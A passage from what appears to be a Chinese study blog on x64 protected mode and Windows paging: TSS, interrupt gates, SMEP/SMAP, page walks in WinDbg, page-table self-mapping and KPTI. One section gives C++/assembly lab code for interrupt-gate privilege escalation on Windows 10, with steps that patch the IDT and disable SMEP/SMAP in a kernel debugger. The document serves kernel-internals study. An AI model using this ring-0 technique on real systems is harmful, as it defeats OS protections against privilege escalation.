TSS段</h2><p>TSS段描述符长度为128位，结构如下：</p><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20220822113220169.png" alt="TSS段描述符"></p><p>TSS段需要描述符中的基址，定位方式如下：</p><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20220816204037606.png" alt="TSS内存定位"></p><p>TSS段不用来任务切换，主要保存一些rsp备用指针（用于快速切换r0，r1，r2的堆栈），内存结构如下：</p><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20220816194633520.png" alt="TSS内存结构"></p><h2 id="1-6-中断门"><a href="#1-6-中断门" class="headerlink" title="1.6 中断门"></a>1.6 中断门</h2><h3 id="1-6-1-描述符"><a href="#1-6-1-描述符" class="headerlink" title="1.6.1 描述符"></a>1.6.1 描述符</h3><p>中断门描述符长度为128位，结构如下：</p><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20220816195253543.png" alt="中断门描述符"></p><p><strong>IST位：</strong>进0环时，会根据这个值去找TSS中的对应的rsp，为0表示默认使用rsp0。</p><p>Windbg指令：</p><ul><li>!idt：输出当前系统全部中断信息</li><li>!idt 3：指定查看某个中断信息</li></ul><h3 id="1-6-2-中断现场"><a href="#1-6-2-中断现场" class="headerlink" title="1.6.2 中断现场"></a>1.6.2 中断现场</h3><p>int中断发生时，会做出一下动作：</p><p>​TSS.rsp0         -&gt; <strong>rsp</strong></p><p>​中断门描述符 -&gt; <strong>rip</strong></p><p>​中断门描述符 -&gt; <strong>cs</strong>  </p><p>​cs + 16           -&gt;  <strong>ss</strong></p><p>同时将r3的ss、rsp、rflags、cs、rip压栈，此时的rsp处在IDT表的末尾</p><h3 id="1-6-3-int3入口分析"><a href="#1-6-3-int3入口分析" class="headerlink" title="1.6.3 int3入口分析"></a>1.6.3 int3入口分析</h3><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20221025184118300.png" alt="int3入口"></p><p>上述代码主要完成以下的是：</p><ul><li>完成0环cr3的切换，KPTI机制</li><li>完成0换堆栈的切换，并将旧堆栈数据拷贝过去，使此时的栈如int指令发生时一致</li><li>跳转到中断处理例程</li></ul><h3 id="1-6-4-代码框架"><a href="#1-6-4-代码框架" class="headerlink" title="1.6.4 代码框架"></a>1.6.4 代码框架</h3><p><strong>Win10 1904中断门提权代码：</strong></p><p>Entry.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">// Debug x64</span><br><span class="hljs-comment">// 关闭随机基址</span><br><span class="hljs-comment">// 关闭增量链接</span><br><br><span class="hljs-comment">// !idt 0x21 (获取idt首地址)</span><br><span class="hljs-comment">// eq fffff800`2fa77210  4000ee00`00101000 00000000`00000001</span><br><br><span class="hljs-comment">// 清空cr4的SMEP和SMAP位</span><br><br><span class="hljs-comment">// 修改进程pte属性--可以执行r3代码</span><br><span class="hljs-comment">// !pte 140001000</span><br><br>UINT64 read_val = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">IDTEntry</span><span class="hljs-params">(UINT64* read)</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GoTrap</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ULONG64 g_rsp;<br>ULONG64 g_rsp;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ULONG64 g_cs;<br>ULONG64 g_cs;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> WORD g_ss;<br>WORD g_ss;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> ((UINT64)IDTEntry != <span class="hljs-number">0x0140001000</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong fun addr. %p\n&quot;</span>, (UINT64)IDTEntry);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-built_in">GoTrap</span>();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;g_rsp: %x\r\n&quot;</span>, g_rsp);<br><span class="hljs-comment">// printf(&quot;g_cs: %x\r\n&quot;, g_cs);</span><br><span class="hljs-comment">// printf(&quot;g_ss: %x\r\n&quot;, g_ss);</span><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>fun.asm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs assembly">option casemap:none<br><br>EXTERN g_rsp: qword<br>EXTERN g_cs: qword<br>EXTERN g_ss: word<br><br>.data<br><br>.code<br><br>IDTEntry proc<br><br>stac<br>swapgs<br>lfence<br>bt dword ptr gs:[9018h], 1<br>jb change_cr3<br><br>mov rsp, gs:[9000h]<br>mov cr3, rsp<br><br>change_cr3:<br><br>mov rsp, gs:[9008h]<br>mov gs:[10h], rsi<br>mov rsi, gs:[38h]<br>add rsi, 4200h<br>push qword ptr [rsi-8]<br>push qword ptr [rsi-10h]<br>push qword ptr [rsi-18h]<br>push qword ptr [rsi-20h]<br>push qword ptr [rsi-28h]<br>mov rsi, gs:[10h]<br>and qword ptr gs:[10h], 0<br><br>mov rax, rsp<br>mov g_rsp, rax<br><br>mov rax, gs:[188h]<br>mov rax, [rax+220h]<br>mov rax, [rax+388h]<br>bt eax, 0<br>jnb recover_cr3<br>bts rax, 03fh<br>recover_cr3:<br><br>mov cr3, rax<br><br>swapgs<br>iretq<br><br>IDTEntry endp<br><br>GoTrap proc<br>int 21h<br>    ret<br>GoTrap endp<br><br>END<br></code></pre></td></tr></table></figure><h2 id="1-7-SMEP和SMAP"><a href="#1-7-SMEP和SMAP" class="headerlink" title="1.7 SMEP和SMAP"></a>1.7 SMEP和SMAP</h2><p>控制寄存器结构如图所示：</p><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20220822143521139.png" alt="控制寄存器结构"></p><p>x64下，Cr4寄存器的20和21bit分别代表SMEP和SMAP。</p><ul><li><strong>SMEP：</strong>不允许内核权限执行用户代码</li><li><strong>SMAP：</strong>不允许内核权限读写用户内存</li></ul><p><strong>stac指令</strong>用来关闭SMAP检测，本质修改rflags寄存器的AC位，详情见intel手册。</p><h1 id="2-分页机制"><a href="#2-分页机制" class="headerlink" title="2.分页机制"></a>2.分页机制</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h2><p>​IA-32e模式下，虚拟地址宽度为64位，但只有低48位有效，最多可以寻址256TB，高16位用作符号拓展（全0或全1），物理页面仍为4KB。CPU 分页机制变为4级，分别对应 PML4、PDPT、PD、PT表，Cr3 寄存器中的物理地址指向 PML4 表的首地址，每个表项8字节，并将48位虚拟地址按 9-9-9-9-12 索引格式划分。如下图所示：</p><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20220822210107370.png" alt="分页简介"></p><h2 id="2-2-手动拆分"><a href="#2-2-手动拆分" class="headerlink" title="2.2 手动拆分"></a>2.2 手动拆分</h2><p>Windbg 中手动拆分64位虚拟地址，并按照上面的分页规则计算出物理地址。实验选用 idt 表首地址进行拆分。（在计算物理地址时，需要对页表项的低12位属性位清0。）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">kd&gt; r idtr<br>idtr=fffff8037888e000<br>kd&gt; dq fffff8037888e000<br>fffff803`7888e000  761e8e00`00107e00 00000000`fffff803<br>fffff803`7888e010  761e8e04`00108140 00000000`fffff803<br>fffff803`7888e020  761e8e03`00108600 00000000`fffff803<br>fffff803`7888e030  761eee00`00108ac0 00000000`fffff803<br>fffff803`7888e040  761eee00`00108e00 00000000`fffff803<br>fffff803`7888e050  761e8e00`00109140 00000000`fffff803<br>fffff803`7888e060  761e8e00`00109680 00000000`fffff803<br>fffff803`7888e070  761e8e00`00109b80 00000000`fffff803<br></code></pre></td></tr></table></figure><p>将虚拟地址按照 9-9-9-9-12 格式划分（注意低48位有效）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">fffff803`7888e000 -&gt; f803`7888e000<br><br>1 1111 00000x1f0PML4I<br>0 0000 11010xdPDPTI<br>1 1100 01000x1c4PTI<br>0 1000 11100x8ePDI<br>0000000000000x0Offset<br></code></pre></td></tr></table></figure><p>访问 Cr3 + PML4I * 8 指向的物理地址得到 PDPTE 的物理地址</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">kd&gt; r cr3<br>cr3=0000000052c76000<br>kd&gt; !dq 52c76000+1f0*8<br>#52c76f80 00000000`00c08063 00000000`00000000<br>#52c76f90 00000000`00000000 00000000`00000000<br>#52c76fa0 00000000`00000000 00000000`00000000<br>#52c76fb0 0a000000`0bafc863 00000000`00000000<br>#52c76fc0 00000000`00000000 00000000`00000000<br>#52c76fd0 00000000`00000000 00000000`00000000<br>#52c76fe0 00000000`00000000 00000000`00000000<br>#52c76ff0 00000000`00000000 00000000`00ca8063<br></code></pre></td></tr></table></figure><p>访问 PDPTE + PDPTI * 8 指向的物理地址得到 PTE 的物理地址</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">kd&gt; !dq c08000+d*8<br>#  c08068 00000000`00c09063 00000000`00000000<br>#  c08078 00000000`00000000 00000000`00000000<br>#  c08088 00000000`00000000 00000000`00000000<br>#  c08098 00000000`00000000 00000000`00000000<br>#  c080a8 00000000`00000000 00000000`00000000<br>#  c080b8 00000000`00000000 00000000`00000000<br>#  c080c8 00000000`00000000 00000000`00000000<br>#  c080d8 00000000`00000000 00000000`00000000<br></code></pre></td></tr></table></figure><p>访问 PTE + PTI * 8 指向的物理地址得到 PDE 的物理地址</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">kd&gt; !dq c09000+1c4*8<br>#  c09e20 00000000`00ca7063 0a000000`03996863<br>#  c09e30 0a000000`0f5bc863 0a000000`0f5bd863<br>#  c09e40 0a000000`0f5be863 0a000000`0f5bf863<br>#  c09e50 0a000000`032c0863 0a000000`032c1863<br>#  c09e60 0a000000`040c3863 0a000000`02bc4863<br>#  c09e70 0a000000`02bc5863 0a000000`02bc6863<br>#  c09e80 0a000000`02bc7863 0a000000`02bc8863<br>#  c09e90 0a000000`02bc9863 0a000000`02bca863<br></code></pre></td></tr></table></figure><p>访问 PDE + PDI * 8 指向的物理地址得到物理页面</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">kd&gt; !dq ca7000+8e*8<br>#  ca7470 89000000`0588e121 89000000`0588f963<br>#  ca7480 89000000`05890963 89000000`05891963<br>#  ca7490 89000000`05892963 89000000`05893963<br>#  ca74a0 00000000`00000000 89000000`05895963<br>#  ca74b0 89000000`05896963 89000000`05897963<br>#  ca74c0 89000000`05898963 89000000`05899963<br>#  ca74d0 89000000`0589a963 89000000`0589b963<br>#  ca74e0 00000000`00000000 89000000`0589d963<br></code></pre></td></tr></table></figure><p>最终，访问 物理页面 + Offset 指向的物理地址得到内容</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">kd&gt; !dq 0588e000<br># 588e000 761e8e00`00107e00 00000000`fffff803<br># 588e010 761e8e04`00108140 00000000`fffff803<br># 588e020 761e8e03`00108600 00000000`fffff803<br># 588e030 761eee00`00108ac0 00000000`fffff803<br># 588e040 761eee00`00108e00 00000000`fffff803<br># 588e050 761e8e00`00109140 00000000`fffff803<br># 588e060 761e8e00`00109680 00000000`fffff803<br># 588e070 761e8e00`00109b80 00000000`fffff803<br></code></pre></td></tr></table></figure><h2 id="2-3-页表属性"><a href="#2-3-页表属性" class="headerlink" title="2.3 页表属性"></a>2.3 页表属性</h2><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20221025153150121.png" alt="页表属性"></p><h2 id="2-4-页表自映射"><a href="#2-4-页表自映射" class="headerlink" title="2.4 页表自映射"></a>2.4 页表自映射</h2><h3 id="2-4-1-简介"><a href="#2-4-1-简介" class="headerlink" title="2.4.1 简介"></a>2.4.1 简介</h3><p>​在64位模式下，高等级页表项都指向低等级页表项的物理地址，依次类推，直到最低级别页表项，即可获取物理页面进而读取内容。在此过程中 Cr3 寄存器中存储了最高级页表（PML4）的表基物理地址。<strong>为了更好的管理这些页表，微软采取了最高级页表基址自映射的方式实现仅仅利用8字节物理内存，就可以在每次访问分页管理相关的内存时，少做一次页表查询操作来优化速度。</strong></p><h3 id="2-4-2-原理"><a href="#2-4-2-原理" class="headerlink" title="2.4.2 原理"></a>2.4.2 原理</h3><p>​在四级页表的最高级 PML4 页表中存在一项，里面保存了 PML4 页表的表基物理地址，即 Cr3 。假设这一项在 PML4 表中的索引为 0x100，如下图所示：</p><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20220824154450478.png" alt="页表自映射原理"></p><p>此时满足：（ <strong>![物理地址]</strong> 表示读取物理地址的内容 ）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">![Cr3 + 0x100 * 8]  =  Cr3<br></code></pre></td></tr></table></figure><p><strong>用于分页管理的物理页面大小总计 512 * 512 * 512 * 4KB &#x3D; 512GB，而一个 PML4 表项恰好可以管理512GB内存。</strong></p><p>PML4 表中索引位置0x100的元素用于内存管理且满足上述关系，那么此时用于内存管理的虚拟地址空间为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0xFFFF8000`00000000 ~ 0xFFFF807F`FFFFF000<br></code></pre></td></tr></table></figure><p>按照 9-9-9-9-12 分页方式去拆分上述边界物理地址：（ 只使用低48位 ）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">// 起始地址<br>0x8000`00000000<br>1 0000 00000x100<br>0 0000 00000x0<br>0 0000 00000x0<br>0 0000 00000x0<br>0000 0000 00000x0<br><br>// 结束地址<br>0x807F`FFFFF000<br>1 0000 00000x100<br>1 1111 11110x1FF<br>1 1111 11110x1FF<br>1 1111 11110x1FF<br>0000 0000 00000x0<br></code></pre></td></tr></table></figure><p>常规查询流程：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">// 起始地址<br>![Cr3 + 0x100 * 8] = PDPTE<br>![PDPTE + 0x0 * 8] = PDE<br>![PDE + 0x0 * 8] = PTE<br>![PTE + 0x0 * 8] = 物理页面<br><br>// 结束地址<br>![Cr3 + 0x100 * 8] = PDPTE<br>![PDPTE + 0x1FF * 8] = PDE<br>![PDE + 0x1FF * 8] = PTE<br>![PTE + 0x0 * 8] = 物理页面<br></code></pre></td></tr></table></figure><p>根据上述等式，![Cr3 + 0x100 * 8]  &#x3D;  Cr3，所以查询流程变为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">// 起始地址<br>![Cr3 + 0x0 * 8] = PDE<br>![PDE + 0x0 * 8] = PTE<br>![PTE + 0x0 * 8] = 物理页面<br><br>// 结束地址<br>![Cr3 + 0x1FF * 8] = PDE<br>![PDE + 0x1FF * 8] = PTE<br>![PTE + 0x0 * 8] = 物理页面<br></code></pre></td></tr></table></figure><p>很神奇，<strong>查询页表操作由四次变成了三次</strong>，效率大大提升。而且只是使用了8字节的物理地址空间来保存 Cr3 。下图展示了优化后的查询过程：</p><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20220824155317399.png" alt="优化后的查询过程"></p><h3 id="2-4-3-规律"><a href="#2-4-3-规律" class="headerlink" title="2.4.3 规律"></a>2.4.3 规律</h3><p>为了写代码方便读写页表属性，四级页表都应该有自己的表基虚拟地址，以便访问其中的元素。</p><h4 id="a-推导-PML4-基址"><a href="#a-推导-PML4-基址" class="headerlink" title="a.推导 PML4 基址"></a><strong>a.推导 PML4 基址</strong></h4><p>PML4 页表基址有两个特点：</p><ul><li>属于虚拟地址</li><li>虚拟地址的内容是Cr3</li></ul><p>假设该虚拟地址按照 9-9-9-9-12 分页规则拆分得到的索引依次为 x、y、z、r，根据页表解析规则：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">![Cr3 + x * 8]   = PDPTE<br>![PDPTE + y * 8] = PDE<br>![PDE + z * 8]   = PTE<br>![PTE + r * 8]   = 物理页面 = Cr3<br></code></pre></td></tr></table></figure><p>还需要满足 ![Cr3 + x * 8]  &#x3D;  Cr3，所以当 x  &#x3D;  y  &#x3D;  z  &#x3D;  r 的时候上述条件均满足。</p><h4 id="b-推导-PDPT-基址"><a href="#b-推导-PDPT-基址" class="headerlink" title="b.推导 PDPT 基址"></a><strong>b.推导 PDPT 基址</strong></h4><p> PDPT 页表基址有两个特点：</p><ul><li>属于虚拟地址</li><li>虚拟地址的内容不再是Cr3，而是 ![Cr3 + 0 * 8] 指向的物理地址。</li></ul><p>假设该虚拟地址按照 9-9-9-9-12 分页规则拆分得到的索引依次为 x、y、z、r，根据页表解析规则：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">![Cr3 + x * 8]   = PDPTE<br>![PDPTE + y * 8] = PDE<br>![PDE + z * 8]   = PTE<br>![PTE + r * 8]   = ![Cr3]<br></code></pre></td></tr></table></figure><p>还需要满足 ![Cr3 + x * 8]  &#x3D;  Cr3，所以当 x  &#x3D;  y  &#x3D;  z 且 r &#x3D; 0 的时候上述条件均满足。</p><h4 id="c-推导-PD、PT-基址"><a href="#c-推导-PD、PT-基址" class="headerlink" title="c.推导 PD、PT 基址"></a><strong>c.推导 PD、PT 基址</strong></h4><p>​方法同理。</p><h4 id="d-结论"><a href="#d-结论" class="headerlink" title="d.结论"></a><strong>d.结论</strong></h4><p>页内偏移均为0时： </p><ul><li><strong>PML4：PML4i &#x3D;&#x3D; PDTi &#x3D;&#x3D; PDi &#x3D;&#x3D; PTi &#x3D;&#x3D; Index</strong></li><li><strong>PDPT：PML4i &#x3D;&#x3D; PDTi &#x3D;&#x3D; PDi &#x3D;&#x3D; Index &amp;&amp; PTi &#x3D;&#x3D; 0</strong></li><li><strong>PD：     PML4i &#x3D;&#x3D; PDTi &#x3D;&#x3D; Index &amp;&amp; PDi &#x3D;&#x3D; 0 &amp;&amp; PTi &#x3D;&#x3D; 0</strong></li><li><strong>PT：      PML4i &#x3D;&#x3D; Index &amp;&amp; PDTi &#x3D;&#x3D; 0 &amp;&amp; PDi &#x3D;&#x3D; 0 &amp;&amp; PTi &#x3D;&#x3D; 0</strong></li></ul><h2 id="2-5-基址随机化"><a href="#2-5-基址随机化" class="headerlink" title="2.5 基址随机化"></a>2.5 基址随机化</h2><h3 id="2-5-1-原理"><a href="#2-5-1-原理" class="headerlink" title="2.5.1 原理"></a>2.5.1 原理</h3><p>​上面得到结论中的 Index 就是自映射表项在 PML4 表中的索引，这个值的变化就是造成各级页表基址变化的原因。</p><p>系统重启前的 PML4 基址：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">0xFB7DBEDF6000<br>1 1111 01100x1F6PML4<br>1 1111 01100x1F6PDPT<br>1 1111 01100x1F6PD<br>1 1111 01100x1F6PT<br>0000000000000x0<br><br>Index为：0x1F6<br></code></pre></td></tr></table></figure><p>系统重启后的PML4基址：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">0x8D46A351A000 <br>1 0001 10100x11A<br>1 0001 10100x11A<br>1 0001 10100x11A<br>1 0001 10100x11A<br>0000000000000<br><br>Index为：0x11A<br></code></pre></td></tr></table></figure><h3 id="2-5-2-定位"><a href="#2-5-2-定位" class="headerlink" title="2.5.2 定位"></a>2.5.2 定位</h3><p>​页表基址随机化导致写代码读写页表属性变得不方便，但可以利用页表自映射的一些结论来获取 PML4  表基址。PML4 表基址的内容为Cr3的值，并且位于 PML4 表所在的页面内。因为Cr3里保存了 PML4 的表基物理地址，所以可以通过映射Cr3物理地址的虚拟地址，遍历这个虚拟地址页面的512个地址，哪个地址符合上述条件，哪个地址就是 PML4 表基址。驱动代码实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">ULONG64 <span class="hljs-title function_">GetPml4Base</span><span class="hljs-params">(ULONG64 ulNtBase)</span><br>&#123;<br>PHYSICAL_ADDRESS pCr3 = &#123; <span class="hljs-number">0</span> &#125;;<br>pCr3.QuadPart = __readcr3();<br>PULONG64 pCmpArr = MmGetVirtualForPhysical(pCr3);<br><br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> ((*pCmpArr &amp; <span class="hljs-number">0xFFFFFFFFF000</span>) != pCr3.QuadPart)<br>&#123;<br><span class="hljs-keyword">if</span> (count++ &gt;= <span class="hljs-number">512</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>pCmpArr++;<br>&#125;<br><span class="hljs-keyword">return</span> (ULONG64)pCmpArr &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到了 PML4 表基址，就可以得到 Index 索引值，其他各级页表基址也就都可以得到了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">ULONG64 <span class="hljs-title function_">GetPdptBase</span><span class="hljs-params">(ULONG64 ulPml4Base)</span><br>&#123;<br><span class="hljs-keyword">return</span> (ulPml4Base &gt;&gt; <span class="hljs-number">21</span>) &lt;&lt; <span class="hljs-number">21</span>;<br>&#125;<br><br>ULONG64 <span class="hljs-title function_">GetPdBase</span><span class="hljs-params">(ULONG64 ulPml4Base)</span><br>&#123;<br><span class="hljs-keyword">return</span> (ulPml4Base &gt;&gt; <span class="hljs-number">30</span>) &lt;&lt; <span class="hljs-number">30</span>;<br>&#125;<br><br>ULONG64 <span class="hljs-title function_">GetPtBase</span><span class="hljs-params">(ULONG64 ulPml4Base)</span><br>&#123;<br><span class="hljs-keyword">return</span> (ulPml4Base &gt;&gt; <span class="hljs-number">39</span>) &lt;&lt; <span class="hljs-number">39</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-6-KPTI"><a href="#2-6-KPTI" class="headerlink" title="2.6 KPTI"></a>2.6 KPTI</h2><p>为了避免r3利用漏洞越权访问r0内存，cpu为r3和r0各分配一个cr3，二者映射状态如下所示：</p><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20221025155557411.png" alt="cr3映射关系"></p><p>其中KVASCODE是两个cr3都映射的区域，用于在r3切换到r0时完成cr3转换工作。r0所使用的cr3保存在KPRCB.KernelDirectoryTableBase中。</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> cpu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件格式</title>
      <link href="/2022/10/24/pe-wen-jian-ge-shi/"/>
